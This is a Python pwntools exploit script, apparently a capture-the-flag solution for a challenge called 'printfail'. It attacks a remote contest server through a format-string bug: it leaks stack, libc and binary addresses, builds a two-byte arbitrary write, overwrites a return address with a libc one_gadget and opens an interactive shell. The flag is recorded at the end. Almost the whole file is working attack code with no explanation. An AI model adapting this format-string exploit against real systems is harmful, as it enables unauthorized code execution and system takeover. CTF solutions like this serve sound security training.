from pwn import *
elf = ELF('./printfail.patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# p = elf.process()
p = remote(b'puffer.utctf.live', 4630)

def arbitrary_twobyte_write(address, value):
   # set stack_pointer to arbitrary address
   fmt_str = '%{0}x'.format(eval('0x' + hex(address)[-4:])).encode() + '%{0}$hn'.format(0x4 + 0x2 + 0x9).encode()
   fmt_str += '%{0}$hn'.format(0x4 + 0x2 + 0x1).encode()
   p.sendlineafter(b'.\n', fmt_str)

   # write to arbitrary address
   fmt_str = '%{0}x'.format(value).encode() + '%{0}$hn'.format(0x4 + 0x2 + 0x25).encode()
   fmt_str += '%{0}$hn'.format(0x4 + 0x2 + 0x1).encode()
   p.sendlineafter(b'.\n', fmt_str)

fmt_str  = "|%{0}$p|%{1}$p|%{2}$p|".format(
   # pointer stack->stack
   (0x4 + 0x2 + 0x2),
   # libc
   (0x4 + 0x2 + 0x7),
   # elf
   (0x4 + 0x2 + 0x3)
).encode()
# unlimited input
fmt_str += '%{0}$hn'.format(0x4 + 0x2 + 0x1).encode()
p.sendlineafter(b'.\n', fmt_str)

# calculate offset
leak = p.recvline_contains(b'|').split(b'|')
stack = eval(leak[1])
stack_libc_start_main = stack+0x8

libc.address = (eval(leak[2])-243) - libc.sym['__libc_start_main']
elf.address = eval(leak[3]) - 0x12d0
log.info(f'elf base     @ 0x{elf.address:x}')
log.info(f'libc base    @ 0x{libc.address:x}')

# overwrite return address to one_gadget
data_to_overwrite = p64(libc.address + 0xe3b01)[:-4]
for x in enumerate([data_to_overwrite[i:i+2] for i in range(0, len(data_to_overwrite), 2)]):
   arbitrary_twobyte_write(stack_libc_start_main+(x[0]*2), u16(x[1]))

# spawn shell
p.sendlineafter(b'chance.', b'o_o :3')
p.interactive()
# utflag{one_printf_to_rule_them_all}
